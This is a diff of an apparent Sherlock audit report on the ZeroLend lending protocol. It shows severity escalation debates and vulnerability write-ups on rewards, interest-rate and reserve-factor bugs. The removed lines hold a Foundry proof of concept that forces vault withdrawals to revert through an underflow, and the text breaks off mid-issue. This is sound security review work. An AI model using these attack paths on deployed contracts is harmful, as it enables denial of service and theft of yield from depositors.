+If the pool manager did everything right, then there is no issue here. By default, he is the external admin and, by default, should do everything correctly. If not, it is a user mistake. 
+
+@nevillehuang explained it in the first comment. 
+
+My decision to reject the escalation remains.
+
+**Honour-d-dev**
+
+@cvetanovv i appreciate the effort 🙏
+
+Consider this. Alice creates a pool and decides to add the AML token to her pool and she also adds the chainlink AML/USD oracle to this pool.
+
+From every perspective Alice has done everything right.
+This cannot be grouped as user mistakes because user mistakes only hurt themselves, hence why they are invalid.
+
+In this case Alice is a pool manager and this issue will affect all users of their pool not just Alice.
+
+As I mentioned in previous comments I believe the chances of this happening is very high.
+And it would be unfair to pool users to call it a user mistake. 
+
+**samuraii77**
+
+@cvetanovv. how would a pool manager do everything right though? If he wants to create a pool for an asset that has a different amount of decimals in Chainlink, then this will always lead to an error. His only way of avoiding this is not creating a pool with such an asset which I don't believe is a fair reason to classify this as invalid.
+
+**cvetanovv**
+
+@Honour-d-dev @samuraii77 I understand your points.
+
+The protocol will use standard tokens, but some standard tokens may return a different price due to the lack of decimal scaling. 
+This means that the pool manager will not be able to use them, although it is mentioned in the readme that they can be used. 
+
+This means no working functionality because they will not be used because the pool manager has to act rationally, and using them will cause a bug - Medium severity. 
+
+Reference: https://ethereum.stackexchange.com/questions/92508/do-all-chainlink-feeds-return-prices-with-8-decimals-of-precision, https://ethereum.stackexchange.com/questions/90552/does-chainlink-decimal-change-over-time
+
+I am planning to accept the escalation and make this issue Medium severity.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates 
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166/#issuecomment-2395201631): accepted
+
+**coffiasd**
+
+@cvetanovv those issues that dups with this issue are also valid or not ? 
+
+**cvetanovv**
+
+@coffiasd, the duplicates are also valid. Labels are added at the end after the escalations are over.
+
+# Issue M-5: After a User withdraws The interest Rate is not updated accordingly leading to the next user using an inflated index during next deposit before the rate is normalized again 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/387 
 
@@ -4044,7 +3634,7 @@ Encountered a total of 1 failing tests, 0 tests succeeded
 5. The attacker will mint more shares than they should and this can be weaponised to game the system for some profit by an attacker who just need to simply wait for a withdraw and then deposit lots of funds. 
 6. Since DefaultReserveInterestRateStrategy uses IERC20(params.reserve).balanceOf(msg.sender). Attacker gains more amount than they should when the new rate is normalised.
 
-# Issue M-11: The rewards distribution in the NFTPositionManager is unfair 
+# Issue M-6: The rewards distribution in the NFTPositionManager is unfair 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393 
 
@@ -4277,7 +3867,198 @@ There is no `reward system` that requires users to continuously update their `ba
 How can users realistically update their `balances` every second to receive accurate `rewards`? 
 Is this practical?
 
-# Issue M-12: Position Risk Management Functionality Missing in Position Manager and dos in certain conditions 
+**0xspearmint1**
+
+escalate
+
+This issue does not meet Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) that requires the following:
+>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+
+For this issue to cause a 0.01% loss there must be an unrealistic increase in the liquidityIndex in an extremely small 14 day period. The POC provided inflates the liquidity index by borrowing a 60% of the funds at a huge interest rate for 5.5 years, this is absolutely not realistic and will never happen.
+
+
+
+
+**sherlock-admin3**
+
+> escalate
+> 
+> This issue does not meet Sherlock's [criteria for a medium issue](https://docs.sherlock.xyz/audits/real-time-judging/judging#v.-how-to-identify-a-medium-issue) that requires the following:
+> >Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+> 
+> For this issue to cause a 0.01% loss there must be an unrealistic increase in the liquidityIndex in an extremely small 14 day period. The POC provided inflates the liquidity index by borrowing a 60% of the funds at a huge interest rate for 5.5 years, this is absolutely not realistic and will never happen.
+> 
+> 
+> 
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**aliX40**
+
+This issue is a high severity bug:
+- Tracking shares instead of assets is basically 101 of staking rewards contracts. 
+- There is a provable and pocable significant  loss/theft of yield (more than 1%)
+- Rewards Accounting is completly false 
+
+**obou07**
+
+escalate 
+per [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393#issuecomment-2395124046)
+
+**sherlock-admin3**
+
+> escalate 
+> per [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393#issuecomment-2395124046)
+
+You've created a valid escalation!
+
+To remove the escalation from consideration: Delete your comment.
+
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**cvetanovv**
+
+I think this issue can be of High severity. 
+
+The attack path described in #58 shows very well how a user can deposit 1 USDC every day and earn more rewards than a normal user. 
+
+To execute this attack, we have almost no restrictions( except the normal ones, to have a reward and interest rate above zero), and the losses exceed 1%.
+
+Planning to accept @obou07 escalation and make this issue High.
+
+**0xSpearmint**
+
+@cvetanovv This issue has a severe constraint:
+1. The other users must not update their position at all for an extended period of time (~4 months to create a 1% difference). This is an external constraint out of the control of the attacker. Furthermore, since a reward EPOCH lasts only 2 weeks it is likely that users will redeem rewards and then compound them back into their position, this totally protects them from the issue.
+
+
+**samuraii77**
+
+The intended design is for users to __NOT__ update their position, thus it is expected for users to not update their positions for prolonged periods of time. For that reason, the used word "constraint" is not quite correct, it is not a constraint, it is the expected scenario.
+
+**0xSpearmint**
+
+High severity states
+>Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.
+
+What I described is an external condition (user does not update their position at all, for an extended period of time) that looks extensive to me. All it takes is for a user to supply/withdraw from their position once in a 4 month period to make this issue have very low impact.
+
+
+**samuraii77**
+
+That is a limitation but not an extensive one as I mentioned in my above comment - users have absolutely no reason to update their positions usually. The only reason people would update their position is due to the issue mentioned in this report which means that only a few users who have a good understanding of Solidity and a rather malicious mindset would update their positions. 
+
+Furthermore, it only takes 1 user not updating his position to cause a loss of funds.
+
+**0xSpearmint**
+
+It is ridiculous to say the only reason people will update their position is this issue. Users modify their positions for a multitude of reasons in DEFI (moving to a different pool with more yield, compounding rewards, etc).
+
+**etherSky111**
+
+As a normal DeFi user, will you update your position continuously?
+
+**0xSpearmint**
+
+All the user has to do is update their position once every few months.
+
+**cvetanovv**
+
+@0xSpearmint is right. Most users are short-term investors(rather than long-term) who would update their positions more frequently. The chances of someone updating their position at least once every few months are huge and do not match the High severity rule, whereby there shall be **no limitations**.
+
+My decision is to reject both escalations and leave this issue Medium severity.
+
+**iamnmt**
+
+@cvetanovv 
+
+> Most users are short-term investors(rather than long-term) who would update their positions more frequently.
+
+I think it is not fair to make that assumption. It is a subjective assumption. It is equally likely a user is a short-term investor or a long-term investor. The impact for the long-term investor satisfies the high severity requirement.
+
+**0xSpearmint**
+
+ALL investors (short term/ long term) are incentivised to compound rewards back into their positions ASAP to get a greater return.
+
+**etherSky111**
+
+Of course, the final decision is up to @cvetanovv  and I don't want to argue.
+But @0xSpearmint is thinking wrongly.
+
+
+> ALL investors (short term/ long term) are incentivised to compound rewards back into their positions ASAP to get a greater return.
+
+Could you please let me know about any other reward system where stakers should update their positions repeatedly to get a correct rewards?
+This is obviously a bug and there is no guarantee that all investers should update their positions ASAP to get a greater return.
+
+As a long-term inversters, how do they know whether their rewards are calculated wrongly if they didn't update their positions?
+Maybe the protocol notify to them?
+
+**0xSpearmint**
+
+I agree this is an issue. But it does not meet sherlock's strict criteria for high severity.
+
+Here is sherlock's criteria for medium:
+>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained.
+
+This issue requires a specific external condition, the other users must not update their position **at all for an extended period of time** (4 months).
+
+**etherSky111**
+
+This is my last comment.
+
+
+> I agree this is an issue. But it does not meet sherlock's strict criteria for high severity.
+> 
+> Here is sherlock's criteria for medium:
+> 
+> > Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained.
+> 
+> This issue requires a specific external condition, the other users must not update their position **at all for an extended period of time** (4 months).
+
+This is not a specific external condition.
+Imagine there are 100 stakers and are you sure that all these users update their positions in 4 months?
+If I am a long term staker and I deposited large tokens to get `ZERO` token rewards, I won't update my positions for a long period as I believe the rewards calculation is correct.
+Unfortunately, there is an error in the rewards calculation and I will lose funds accidently.
+But I think this is at most medium issue because this is my mistake to not update my positions accordingly.
+I should've update my positions every 4 months.
+
+And please stop arguing and let the judge decide.
+
+
+**cvetanovv**
+
+This is the rule for **High** severity:
+
+> Definite loss of funds **without** (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.
+
+We only have a 1% loss if someone doesn't update their position for a few months. This is a serious limitation. To be High severity, there should be no limitation as written in the rule.
+
+But it perfectly fits the **Medium** severity rule:
+
+>Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+
+My decision is to reject both escalations and leave this issue Medium severity.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
+
+**sherlock-admin3**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393/#issuecomment-2393292065): rejected
+- [obou07](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/393/#issuecomment-2395131426): rejected
+
+# Issue M-7: Position Risk Management Functionality Missing in Position Manager and dos in certain conditions 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/398 
 
@@ -4330,12 +4111,22 @@ Manual Review
 ## Recommendation
 Implement the missing functionality in the `NFTPositionManager.sol`, to allow users to manage the risk on their `NFTPosition`
 
-# Issue M-13: Liquidation fails to update the interest Rate when liquidation funds are sent to the treasury thus the next user uses an inflated index 
+
+
+## Discussion
+
+**0xjuaan**
+
+@nevillehuang The main impact here is that if an admin sets the ltv of a collateral to zero, then users withdrawals from the NFTPositionManager will be DoS'd. If this is valid, shouldn't #166 be valid? Since 166 was invalidated since it required admins to perform actions that lead to issues.
+
+
+
+# Issue M-8: Liquidation fails to update the interest Rate when liquidation funds are sent to the treasury thus the next user uses an inflated index 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/401 
 
 ## Found by 
-A2-security, Bigsam, almurhasan, nfmelendez, trachev
+A2-security, Bigsam, almurhasan, dany.armstrong90, ether\_sky, nfmelendez, trachev
 ### Summary
 
 A bug exists in the Zerolend liquidation process where the interest rate is not updated before transferring liquidation funds to the treasury. This omission leads to an inflated index being used by the next user when performing subsequent actions such as deposits, withdrawals, or borrowing, similar to the previously reported bug in the withdrawal function. As a result, the next user may receive fewer shares or incur an incorrect debt due to the artificially high liquidity rate.
@@ -4607,7 +4398,55 @@ Encountered 1 failing test in test/forge/core/pool/PoolLiquidationTests.t.sol:Po
 5. Other points are stated in issue 387
 
 
-# Issue M-14: Inconsistent Application of Reserve Factor Changes Leads to Protocol Insolvency Risk 
+**0xSpearmint**
+
+This issue is low severity. It does not satisfy the criteria for medium.
+
+As shown by the POC, the difference in shares is 0.00000106% which is not large enough (0.01%) to be medium severity.
+
+
+
+**cvetanovv**
+
+I agree with @0xSpearmint. This issue does not meet the criteria for Medium severity:
+
+> Causes a loss of funds but requires certain external conditions or specific states, or a loss is highly constrained. The loss of the affected party must exceed 0.01% and 10 USD.
+
+I'm planning to invalidate the issue.
+
+**Tomiwasa0**
+
+@cvetanovv  , 
+
+---
+To get the full impact of this kindly apply the appropriate fix to the bugs discovered in the liquidation function issue 473 and others, this creates a scenario also almost similar to issue 199 attacker get free  funds, 
+
+
+In evaluating the current system's functionality, issue 91 identified seven significant impacts resulting from improper handling, specifically regarding the liquidity and collateral management mechanisms:
+
+1. **Incorrect Withdrawals**: The amount withdrawn is consistently 1% of the liquidated amount, which deviates from expected behavior.
+  
+2. **Test Validity**: The test scenario I provided demonstrates the validity of the concern, although I was unable to use an appropriate timeframe due to the Chainlink timestamp check. To ensure accuracy, I strongly recommend both parties rerun the scenario with the following conditions:
+   - Funds are borrowed and remain unpaid after 3 to 6 months.
+   - The collateral value drops, and the user is subsequently liquidated.
+
+3. **Systematic Impact**: As stated in issue 91, testing across all relevant functions reveals that this has a distinct impact on subsequent function calls, altering the expected outputs.
+
+4. **Minting of Free Shares**: By not considering other influencing factors, the current setup inadvertently allows users to mint free shares. These shares can then be converted back to the original amount, creating an imbalance. 
+
+5. **Collateral Decline Over Time**: The decline in collateral value over time affects the Liquidity in the pool, further complicating the issue. The test case clearly illustrates how the system's behavior changes in these scenarios. creates DOS vulnerability like issue 488 and 375.
+
+6. **Use of New Inputs**: By running the system using the new inputs provided, you will see the exact impact referenced by spearmint. This highlights the need for a comprehensive review of the mechanics involved.
+
+---
+
+
+
+**cvetanovv**
+
+@Tomiwasa0 I will agree with your comment and leave this issue as is. 
+
+# Issue M-9: Inconsistent Application of Reserve Factor Changes Leads to Protocol Insolvency Risk 
 
 Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402 
 
@@ -4863,441 +4702,85 @@ https://github.com/aave-dao/aave-v3-origin/blob/3aad8ca184159732e4b3d8c82cd56a87
 
 Also the fix we recomended is inspired by how the eulerv2 handled this, in their vault. (cache reserve factor when calling updateInterestrate, and use the cached factor when updating the index!)
 
-# Issue M-15: Withdrawals can be reverted in the curated vault 
+**0xspearmint1**
 
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/411 
+escalate
 
-## Found by 
-ether\_sky, trachev
-## Summary
-Users can `deposit` `assets` into selected `pools` via a `curated vault`. 
-By doing so, they may `withdraw` more `assets`, as `interest` accumulates in the `pools` over time. 
-However, `withdrawals` may sometimes fail, making it difficult to resolve the issue.
-## Vulnerability Detail
-When users request a `withdrawal` through the `curated vault`, the `vault` pulls `assets` from the selected `pools` one by one. 
-```solidity
-function _withdrawPool(uint256 withdrawAmount) internal {
-  for (uint256 i; i < withdrawQueue.length; ++i) {
-    IPool pool = withdrawQueue[i];
-    (uint256 supplyAssets,) = _accruedSupplyBalance(pool);
-150:    uint256 toWithdraw =
-      UtilsLib.min(_withdrawable(pool, pool.totalAssets(asset()), pool.totalDebt(asset()), supplyAssets), withdrawAmount);
-  }
+`setReserveFactor()` is a protocol admin function
 
-  if (withdrawAmount != 0) revert CuratedErrorsLib.NotEnoughLiquidity();
-}
-```
-On `line 150`, the `withdrawable` amount from each `pool` is calculated. 
-In the `_withdrawable` function, there is a potential for `underflow` if `totalSupplyAssets` is less than `totalBorrowAssets`, preventing users from `withdrawing` their `assets`.
-```solidity
-function _withdrawable(
-  IPool pool,
-  uint256 totalSupplyAssets,
-  uint256 totalBorrowAssets,
-  uint256 supplyAssets
-) internal view returns (uint256) {
-  uint256 availableLiquidity = UtilsLib.min(totalSupplyAssets - totalBorrowAssets, IERC20(asset()).balanceOf(address(pool)));
-  return UtilsLib.min(supplyAssets, availableLiquidity);
-}
-```
+Sherlock rules state
+>Admin could have an incorrect call order. Example: If an Admin forgets to setWithdrawAddress() before calling withdrawAll() This is not a valid issue.
 
-It’s important to note that the `pool` doesn’t guarantee that `totalSupplyAssets` will always exceed `totalBorrowAssets`. 
-Some users interact directly with these `pools` without going through the `curated vault`. 
-If all supplied `assets` are `borrowed` and the `borrow index` exceeds the `liquidity index`, or if depositors `withdraw` as much as possible while `borrowers` maintain their positions, `totalSupplyAssets` can drop below `totalBorrowAssets`.
+>An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue.
 
-To address this issue, the `vault` can remove the `pool` from the `withdrawQueue`. 
-However, this action might cause users to lose their funds, as `assets` supplied to the `pool` would no longer be factored in.
-## Impact
-This is a `DoS`.
-## Code Snippet
-https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L150
-https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/vaults/CuratedVaultGetters.sol#L126-L127
-## Tool used
+1. If the admin calls `forceUpdateReserve()` on the pools before calling `setReserveFactor()` this issue will not exist
 
-Manual Review
-
-## Recommendation
-```solidity
-function _withdrawable(
-  IPool pool,
-  uint256 totalSupplyAssets,
-  uint256 totalBorrowAssets,
-  uint256 supplyAssets
-) internal view returns (uint256) {
--  uint256 availableLiquidity = UtilsLib.min(totalSupplyAssets - totalBorrowAssets, IERC20(asset()).balanceOf(address(pool)));
-+  uint256 availableLiquidity = totalSupplyAssets < totalBorrowAssets ? 0 : UtilsLib.min(totalSupplyAssets - totalBorrowAssets, IERC20(asset()).balanceOf(address(pool)));
-
-  return UtilsLib.min(supplyAssets, availableLiquidity);
-}
-```
+2. Since `setReserveFactor()` is only called by the protocol admin, according to the sherlock rules admin actions that lead to issues are not valid 
 
 
 
-## Discussion
+**sherlock-admin3**
 
-**nevillehuang**
+> escalate
+> 
+> `setReserveFactor()` is a protocol admin function
+> 
+> Sherlock rules state
+> >Admin could have an incorrect call order. Example: If an Admin forgets to setWithdrawAddress() before calling withdrawAll() This is not a valid issue.
+> 
+> >An admin action can break certain assumptions about the functioning of the code. Example: Pausing a collateral causes some users to be unfairly liquidated or any other action causing loss of funds. This is not considered a valid issue.
+> 
+> 1. If the admin calls `forceUpdateReserve()` on the pools before calling `setReserveFactor()` this issue will not exist
+> 
+> 2. Since `setReserveFactor()` is only called by the protocol admin, according to the sherlock rules admin actions that lead to issues are not valid 
+> 
+> 
 
-request poc
+You've created a valid escalation!
 
-Seems invalid, can the DoS be of more than 7 days? Does it meet sherlock rules of DoS? i.e
+To remove the escalation from consideration: Delete your comment.
 
-- Must break core contract functionality
-- Must DoS funds for more than a week without any form of admin retrieval
-- Must be a time sensitive function
+You may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.
+
+**aliX40**
+
+First point: 
+- If the admin calls forceUpdateReserve() on the pools before calling setReserveFactor() this issue will not exist
+
+This is not true and presents a Dos attack vector. Creating pools on zerolend is permissionless, u can't simply expect the admin to call forceUpdateReserve() on 10 of thousands of pools before changing the resrve factor. This is  simply unrealistic, costly and opens an attack vector for people to dos the treasury
+Second point:
+- this issue doesn't expect and admin to make a mistake. Any call or changes to the reserve factor will provide damages to the deployed pools in the system. (Meaning if reserveFactor is increased or decreased there will be  a significant Impact on the system  (Please read our report for full details))
+
+**0xDenzi**
+
+I would also like to clarify further for the escalator that the 2nd point does not apply to functions which itself are broken/incomplete. The issue is not about admin missing or not executing or delaying a call or providing a wrong input. The issue is that the function is missing line/s of code to properly adjust the reserve factor.
+
+**cvetanovv**
+
+This issue falls right between the "Admin Input/call validation" rules and broken functionality:
+
+> Admin could have an incorrect call order. An admin action can break certain assumptions about the functioning of the code.
+
+>Breaks core contract functionality, rendering the contract useless or leading to loss of funds of the affected party larger than 0.01% and 10 USD.
+
+But I think we have broken functionality here, not an admin error.
+
+Planning to reject the escalation and leave the issue as is.
+
+**WangSecurity**
+
+Result:
+Medium
+Has duplicates
 
 **sherlock-admin4**
 
-PoC requested from @etherSky111
+Escalations have been resolved successfully!
 
-Requests remaining: **18**
+Escalation status:
+- [0xspearmint1](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/402/#issuecomment-2395262880): rejected
 
-**etherSky111**
-
-Thanks for judging.
-
-Below is the `PoC` (`ERC4626Test.sol`): 
-```solidity
-function testWithdrawRevert() public {
-  uint256 mintAmount = 1000 ether;
-  /**
-    1. Set the cap of allMarkets[1] to 1000 ether
-    */
-  _setCap(allMarkets[1], mintAmount);
-
-  /**
-    2. Create a supplyQueue consisting of [allMarkets[1], allMarkets[0], idleMarket]
-    */
-  IPool[] memory newSupplyQueue = new IPool[](3);
-  newSupplyQueue[0] = allMarkets[1];
-  newSupplyQueue[1] = allMarkets[0];
-  newSupplyQueue[2] = idleMarket;
-
-  /**
-    3. Set the withdrawQueue to match the supplyQueue. (current withdraw queue is [idleMarket, allMarkets[0], allMarkets[1]] so we need to reverse it.)
-    */
-  uint256[] memory indexes = new uint256[](3);
-  indexes[0] = 2; indexes[1] = 1; indexes[2] = 0;
-
-  vm.prank(allocator);
-  vault.setSupplyQueue(newSupplyQueue);
-  vm.stopPrank();
-  vm.prank(allocator);
-  vault.updateWithdrawQueue(indexes);
-  vm.stopPrank();
-
-  console2.log('supply queue        => ', address(vault.supplyQueue(0)), address(vault.supplyQueue(1)), address(vault.supplyQueue(2)));
-  console2.log('withdraw queue      => ', address(vault.withdrawQueue(0)), address(vault.withdrawQueue(1)), address(vault.withdrawQueue(2)));
-
-  address U1 = address(111);
-  address U2 = address(222);
-  
-  /**
-    4. User U1 deposits 1000 ether of tokenA into the vault. These tokens will be directed to the first market in the sequence, which is `allMarkets[1].
-    */
-  _mintAndApprove(U1, tokenA, mintAmount, address(vault));
-  vm.prank(U1);
-  vault.deposit(mintAmount, U1);
-  vm.stopPrank();
-
-  /**
-    5. User U1 deposits an additional 1000 ether of tokenA into the vault. 
-      Since the cap of the first market (allMarkets[1]) has been reached, these tokens will be deposited into the second market, allMarkets[0].
-    */
-  _mintAndApprove(U1, tokenA, mintAmount, address(vault));
-  vm.prank(U1);
-  vault.deposit(mintAmount, U1);
-  vm.stopPrank();
-
-  console2.log('supplied tokens to the first 2 markets   => ', tokenA.balanceOf(address(allMarkets[1])), tokenA.balanceOf(address(allMarkets[0])));
-
-  DataTypes.ExtraData memory data = DataTypes.ExtraData(bytes(''), bytes(''));
-
-  /**
-    6. User U2 interacts directly with allMarkets[1] by depositing 10,000 ether of tokenB into allMarkets[1].
-    */
-  _mintAndApprove(U2, tokenB, 10 * mintAmount, address(allMarkets[1]));
-  vm.prank(U2);
-  allMarkets[1].supply(address(tokenB), U2, 10 * mintAmount, 0, data);
-  vm.stopPrank();
-
-  /**
-    7. Now, User U2 can borrow 1000 ether of tokenA from allMarkets[1] since they have sufficient collateral(tokenB).
-    */
-  oracleB.updateRoundTimestamp();
-  oracle.updateRoundTimestamp();
-  vm.prank(U2);
-  allMarkets[1].borrow(address(tokenA), U2, mintAmount, 0, data);
-  vm.stopPrank();
-
-  DataTypes.ReserveData memory reserveData_0 = allMarkets[1].getReserveData(address(tokenA));
-  /**
-    8. The initial liquidity index and borrow index are the same. 
-    */
-  console2.log('initial liquidity index                => ', reserveData_0.liquidityIndex);
-  console2.log('initial borrow index                   => ', reserveData_0.borrowIndex);
-  console2.log('liquidity rate                         => ', reserveData_0.liquidityRate);
-  console2.log('borrow rate                            => ', reserveData_0.borrowRate);
-
-  vm.warp(block.timestamp + 1 days);
-  allMarkets[1].forceUpdateReserve(address(tokenA));
-  DataTypes.ReserveData memory reserveData_1 = allMarkets[1].getReserveData(address(tokenA));
-  /**
-    9. After one day, the borrow index increases more than the liquidity index due to the difference in interest calculations—linear for liquidity and compound for borrowing.
-    */
-  console2.log('updated liquidity index                => ', reserveData_1.liquidityIndex);
-  console2.log('updated borrow index                   => ', reserveData_1.borrowIndex);
-
-  /**
-    10. As a result, the total debt exceeds the total assets.
-    */
-  console2.log('total assets     => ', allMarkets[1].totalAssets(address(tokenA)));
-  console2.log('total debts      => ', allMarkets[1].totalDebt(address(tokenA)));
-
-  bool runTest = false;
-//  bool runTest = true;
-  if (runTest) {
-    vm.prank(U1);
-    vault.withdraw(mintAmount, U1, U1);
-    vm.stopPrank();
-  }
-}
-```
-All steps are outlined in the comments within the code. 
-
-Below is the log detailing the specific values.
-```solidity
-supply queue        =>  0x0FdE84cf57B5fB0C2FA4339BE0C3ba34e951Bf60 0xC8011cB77CC747B5F30bAD583eABfb522Be25712 0x543A7158a1a615F84550166650E0b4cd11659792
-withdraw queue      =>  0x0FdE84cf57B5fB0C2FA4339BE0C3ba34e951Bf60 0xC8011cB77CC747B5F30bAD583eABfb522Be25712 0x543A7158a1a615F84550166650E0b4cd11659792
-
-supplied tokens to the first 2 markets   =>  1000000000000000000000 1000000000000000000000
-
-initial liquidity index                =>  1000000000000000000000000000
-initial borrow index                   =>  1000000000000000000000000000
-liquidity rate                         =>  370000000000000000000000000
-borrow rate                            =>  370000000000000000000000000
-
-updated liquidity index                =>  1001013698630136986301369863
-updated borrow index                   =>  1001014212590245764091339463
-
-total assets     =>  1001013698630136986301
-total debts      =>  1001014212590245764091
-```
-If you set `runTest` to `true` in the above `PoC`, you will encounter the following revert reason.
-```solidity
-[2386] market-1::totalAssets(loanToken: [0xE18de8003234FcA1f7d57713877F92F482D1a1c3]) [staticcall]
-    │   │   │   ├─ [380] PoolFactory::implementation() [staticcall]
-    │   │   │   │   └─ ← [Return] Pool: [0x4f22fB6CDf1485baf7B25c58c66CdA38f88Acbc3]
-    │   │   │   ├─ [1002] Pool::totalAssets(loanToken: [0xE18de8003234FcA1f7d57713877F92F482D1a1c3]) [delegatecall]
-    │   │   │   │   └─ ← [Return] 1001013698630136986301 [1.001e21]
-    │   │   │   └─ ← [Return] 1001013698630136986301 [1.001e21]
-    │   │   ├─ [2340] market-1::totalDebt(loanToken: [0xE18de8003234FcA1f7d57713877F92F482D1a1c3]) [staticcall]
-    │   │   │   ├─ [380] PoolFactory::implementation() [staticcall]
-    │   │   │   │   └─ ← [Return] Pool: [0x4f22fB6CDf1485baf7B25c58c66CdA38f88Acbc3]
-    │   │   │   ├─ [977] Pool::totalDebt(loanToken: [0xE18de8003234FcA1f7d57713877F92F482D1a1c3]) [delegatecall]
-    │   │   │   │   └─ ← [Return] 1001014212590245764091 [1.001e21]
-    │   │   │   └─ ← [Return] 1001014212590245764091 [1.001e21]
-    │   │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
-    │   └─ ← [Revert] panic: arithmetic underflow or overflow (0x11)
-```
-This occurs in the function below, as outlined in the report.
-```solidity
-function _withdrawable(
-    IPool pool,
-    uint256 totalSupplyAssets,
-    uint256 totalBorrowAssets,
-    uint256 supplyAssets
-  ) internal view returns (uint256) {
-    // Inside a flashloan callback, liquidity on the pool may be limited to the singleton's balance.
-    uint256 availableLiquidity = UtilsLib.min(totalSupplyAssets - totalBorrowAssets, IERC20(asset()).balanceOf(address(pool)));
-    return UtilsLib.min(supplyAssets, availableLiquidity);
-  }
-```
-It's worth to note that user `U1` can withdraw `mintAmount` from the next market(`allMarkets[0]`) but the `withdrawal` is reverted.
-> request poc
-> 
-> Seems invalid, can the DoS be of more than 7 days? Does it meet sherlock rules of DoS? i.e
-> 
-> * Must break core contract functionality
-> * Must DoS funds for more than a week without any form of admin retrieval
-> * Must be a time sensitive function
-
-- Clearly, this is core functionality of the `curated vault` since `depositing` and `withdrawing` are the primary entry points for an `ERC4626 vault`. 
-- As I mentioned, resolving this issue is challenging.
-  As a one possible solution, the `owner` can remove a `pool` from the `withdrawQueue`, which could lead to `depositors` losing their funds. 
-  Without addressing this problem, there's no certainty as to when the `total assets` will once again exceed the `total debt` in that `pool`. 
-- I believe that `withdrawals` are highly time-sensitive. 
-  What happens if a user's `withdrawal` request is reverted in the `vault`, and they urgently need their funds?
-
-# Issue M-16: Pool supply interest compounds randomly based on the frequency of `ReserveLogic::updateState()` calls, resulting in inconsistant and unexpected returns for suppliers 
-
-Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/428 
-
-## Found by 
-Nihavent
-### Summary
-
-`_updateIndexes()` considers the previously earned interest on supplies as principle on the next update, resulting in a random compounding effect on interest earned. Borrowers may be incentivized to call `forceUpdateReserve()` frequently if gas costs are low relative to the upside of compounding their interest. 
-
-### Root Cause
-
-Any time an action calls `ReserveLogic::updateState()`, [`ReserveLogic::_updateIndexes()` is called](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L91). Note this occurs before important state-changing pool actions as well as through public/external functions such as [`Pool::forceUpdateReserve()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/Pool.sol#L161-L165) and [`Pool::forceUpdateReserves()`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/Pool.sol#L168-L172).
-
-`_updateIndexes()` calculates lienar interest since the last update and uses this to [scale up the `_cache.currLiquidityIndex` and assigns to `_cache.nextLiquidityIndex`](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/ReserveLogic.sol#L225-L227):
-
-```javascript
-  function _updateIndexes(DataTypes.ReserveData storage _reserve, DataTypes.ReserveCache memory _cache) internal {
-    ... SKIP!...
-
-    if (_cache.currLiquidityRate != 0) {
-@>    uint256 cumulatedLiquidityInterest = MathUtils.calculateLinearInterest(_cache.currLiquidityRate, _cache.reserveLastUpdateTimestamp);
-      _cache.nextLiquidityIndex = cumulatedLiquidityInterest.rayMul(_cache.currLiquidityIndex).toUint128();
-      _reserve.liquidityIndex = _cache.nextLiquidityIndex;
-    }
-
-    ... SKIP!...
-  }
-```
-
-This creates a compounding-effect on an intended simple interest calculated, based on the frequency it's called. This is due to the interest accumulated on the last refresh being considered principle on the next refresh.
-
-### Internal pre-conditions
-
-1. Pool functions normally with supply/borrow/repay calls
-
-### External pre-conditions
-
-_No response_
-
-### Attack Path
-
-1. Supplier supplies assets
-2. Borrower takes debt against supplier's assets and pays interest
-3. Indexes are updated at some frequency
-4. Supplier earns compound-like interest on their supplied assets 
-
-
-### Impact
-
-- Suppliers receive compound-interest on their supplied assets instead of the intended fixed/linear interest.
-
-### PoC
-
-Create a new file in /test/forge/core/pool and paste the below contents.
-
